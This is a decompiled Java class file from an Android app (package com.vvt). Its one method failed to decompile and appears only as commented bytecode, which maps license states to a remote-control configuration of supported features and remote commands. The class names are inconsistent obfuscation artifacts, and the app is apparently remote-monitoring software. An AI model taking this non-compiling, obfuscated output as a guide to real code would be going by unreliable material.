package com.vvt.appengine.a;

import com.vvt.ak.a;

public class g
{
  private static final boolean a = a.e;
  
  /* Error */
  public com.vvt.remotecontrol.output.RmtCtrlOutputConfiguration a(com.vvt.license.LicenseInfo paramLicenseInfo, com.vvt.configurationmanager.d paramd)
  {
    // Byte code:
    //   0: new 19	com/vvt/remotecontrol/output/RmtCtrlOutputConfiguration
    //   3: astore_3
    //   4: aload_3
    //   5: invokespecial 20	com/vvt/remotecontrol/output/RmtCtrlOutputConfiguration:<init>	()V
    //   8: aload_1
    //   9: invokevirtual 26	com/vvt/license/LicenseInfo:getConfigurationId	()I
    //   12: istore 4
    //   14: aload_1
    //   15: invokevirtual 30	com/vvt/license/LicenseInfo:getLicenseStatus	()Lcom/vvt/license/LicenseStatus;
    //   18: astore 5
    //   20: getstatic 36	com/vvt/license/LicenseStatus:NOT_ACTIVATED	Lcom/vvt/license/LicenseStatus;
    //   23: astore 6
    //   25: aload 5
    //   27: aload 6
    //   29: if_acmpne +50 -> 79
    //   32: iconst_m1
    //   33: istore 4
    //   35: aload_2
    //   36: iload 4
    //   38: invokeinterface 41 2 0
    //   43: astore 5
    //   45: aload 5
    //   47: invokevirtual 47	com/vvt/configurationmanager/MyUncaughtExceptionHandler:removeFromPath	()Ljava/util/List;
    //   50: astore 6
    //   52: aload 5
    //   54: invokevirtual 51	com/vvt/configurationmanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	()Ljava/util/Map;
    //   57: astore 5
    //   59: aload_3
    //   60: iload 4
    //   62: invokevirtual 55	com/vvt/remotecontrol/output/RmtCtrlOutputConfiguration:setConfigurationID	(I)V
    //   65: aload_3
    //   66: aload 6
    //   68: invokevirtual 59	com/vvt/remotecontrol/output/RmtCtrlOutputConfiguration:setSupportedFeatures	(Ljava/util/List;)V
    //   71: aload_3
    //   72: aload 5
    //   74: invokevirtual 63	com/vvt/remotecontrol/output/RmtCtrlOutputConfiguration:setSupportedRemoteCmds	(Ljava/util/Map;)V
    //   77: aload_3
    //   78: areturn
    //   79: aload_1
    //   80: invokevirtual 30	com/vvt/license/LicenseInfo:getLicenseStatus	()Lcom/vvt/license/LicenseStatus;
    //   83: astore 5
    //   85: getstatic 66	com/vvt/license/LicenseStatus:EXPIRED	Lcom/vvt/license/LicenseStatus;
    //   88: astore 6
    //   90: aload 5
    //   92: aload 6
    //   94: if_acmpne +10 -> 104
    //   97: bipush -2
    //   99: istore 4
    //   101: goto -66 -> 35
    //   104: aload_1
    //   105: invokevirtual 30	com/vvt/license/LicenseInfo:getLicenseStatus	()Lcom/vvt/license/LicenseStatus;
    //   108: astore 5
    //   110: getstatic 69	com/vvt/license/LicenseStatus:DISABLED	Lcom/vvt/license/LicenseStatus;
    //   113: astore 6
    //   115: aload 5
    //   117: aload 6
    //   119: if_acmpne -84 -> 35
    //   122: bipush -3
    //   124: istore 4
    //   126: goto -91 -> 35
    //   129: astore 7
    //   131: getstatic 13	com/vvt/appengine/a/FxFileObserverWorker:a	Z
    //   134: istore 8
    //   136: iload 8
    //   138: ifeq +3 -> 141
    //   141: new 71	com/vvt/remotecontrol/RemoteControlException
    //   144: astore_3
    //   145: aload 7
    //   147: invokevirtual 77	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   150: astore 7
    //   152: aload_3
    //   153: aload 7
    //   155: invokespecial 80	com/vvt/remotecontrol/RemoteControlException:<init>	(Ljava/lang/String;)V
    //   158: aload_3
    //   159: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	160	0	this	FxFileObserverWorker
    //   0	160	1	paramLicenseInfo	com.vvt.license.LicenseInfo
    //   0	160	2	paramd	com.vvt.configurationmanager.d
    //   3	156	3	localObject1	Object
    //   12	113	4	i	int
    //   18	98	5	localObject2	Object
    //   23	95	6	localObject3	Object
    //   129	17	7	localException	Exception
    //   150	4	7	str	String
    //   134	3	8	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   8	12	129	java/lang/Exception
    //   14	18	129	java/lang/Exception
    //   20	23	129	java/lang/Exception
    //   36	43	129	java/lang/Exception
    //   45	50	129	java/lang/Exception
    //   52	57	129	java/lang/Exception
    //   60	65	129	java/lang/Exception
    //   66	71	129	java/lang/Exception
    //   72	77	129	java/lang/Exception
    //   79	83	129	java/lang/Exception
    //   85	88	129	java/lang/Exception
    //   104	108	129	java/lang/Exception
    //   110	113	129	java/lang/Exception
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */